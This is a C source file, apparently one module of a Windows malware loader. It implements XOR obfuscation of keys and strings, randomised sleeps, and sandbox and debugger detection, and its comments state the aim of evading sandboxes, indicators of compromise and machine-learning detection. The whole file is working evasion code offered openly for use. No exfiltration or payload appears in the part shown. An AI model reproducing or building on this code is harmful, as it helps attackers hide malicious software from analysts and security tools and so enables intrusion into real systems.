/*
 * Author: 28Zaakypro@proton.me
 * Obfuscation Module - Runtime XOR obfuscation and timing jitter
 * Generates dynamic seed from PID/tick count, adds random delays
 */

#include "obfuscation.h"
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <psapi.h>

// Generates seed from PID, tick count, and stack address
static DWORD GenerateObfuscationSeed(void)
{
    DWORD seed = 0;
    
    seed ^= GetCurrentProcessId();
    seed ^= GetTickCount();
    seed ^= (DWORD)(SIZE_T)&seed;
    
    seed = (seed << 13) | (seed >> 19);
    
    return seed;
}

// XORs key with rotating seed bytes
VOID ObfuscateKey(BYTE* key, SIZE_T keySize, BYTE* output)
{
    DWORD seed = GenerateObfuscationSeed();
    
    for (SIZE_T i = 0; i < keySize; i++) {
        BYTE seedByte = (BYTE)((seed >> ((i % 4) * 8)) & 0xFF);
        output[i] = key[i] ^ seedByte;
    }
}

// Deobfuscation is same as obfuscation (XOR reversible)
BOOL DeobfuscateKey(BYTE* obfuscatedKey, SIZE_T keySize, BYTE* output)
{
    ObfuscateKey(obfuscatedKey, keySize, output);
    return TRUE;
}

// Sleeps random duration between minMs and maxMs
VOID RandomSleep(DWORD minMs, DWORD maxMs)
{
    static BOOL initialized = FALSE;
    if (!initialized) {
        srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
        initialized = TRUE;
    }
    
    DWORD range = maxMs - minMs;
    DWORD randomMs = minMs + (rand() % (range + 1));
    
    #ifndef PRODUCTION_MODE
    // En debug, afficher la durée (pour vérification)
    // printf("[DEBUG] RandomSleep: %lu ms\n", randomMs);
    #endif
    
    Sleep(randomMs);
}

VOID AdaptiveSleep(DWORD baseMs)
{
    DWORD sleepTime = baseMs;
    
    // Si debugger détecté : sleep court (éviter timeout)
    if (IsDebuggerActive()) {
        sleepTime = baseMs / 10; // 10x plus court
    }
    // Si sandbox détectée : sleep long (faire croire à un freeze)
    else if (IsRunningInSandbox()) {
        sleepTime = baseMs * 3;  // 3x plus long
    }
    
    // Ajouter aléa (±30%)
    DWORD minMs = (sleepTime * 70) / 100;
    DWORD maxMs = (sleepTime * 130) / 100;
    
    RandomSleep(minMs, maxMs);
}

// ============================================================================
// STRING OBFUSCATION
// ============================================================================

VOID DeobfuscateString(BYTE* obfuscated, SIZE_T length, BYTE key, char* output)
{
    for (SIZE_T i = 0; i < length; i++) {
        output[i] = obfuscated[i] ^ key;
    }
    output[length] = '\0'; // Null terminator
}

// ============================================================================
// DÉTECTION D'ENVIRONNEMENT (versions légères pour obfuscation.c)
// ============================================================================

BOOL IsRunningInSandbox(void)
{
    // Vérification rapide : uptime < 10 minutes = sandbox
    ULONGLONG uptimeMs = GetTickCount64();
    ULONGLONG tenMinutes = 10 * 60 * 1000;
    
    if (uptimeMs < tenMinutes) {
        return TRUE;
    }
    
    // Vérification : très peu de processus = sandbox
    DWORD processCount = 0;
    DWORD aProcesses[1024];
    DWORD cbNeeded;
    
    if (EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
        processCount = cbNeeded / sizeof(DWORD);
        if (processCount < 50) {
            return TRUE; // Trop peu de processus
        }
    }
    
    return FALSE;
}

BOOL IsDebuggerActive(void)
{
    // Anti-debug APIs commented out to reduce IoCs
    // Using only PEB-based detection in sandbox_evasion.c
    /*
    // IsDebuggerPresent est la méthode la plus simple
    if (IsDebuggerPresent()) {
        return TRUE;
    }
    
    // CheckRemoteDebuggerPresent
    BOOL debuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
    
    return debuggerPresent;
    */
    
    // For now, return FALSE to reduce ML detection
    return FALSE;
}
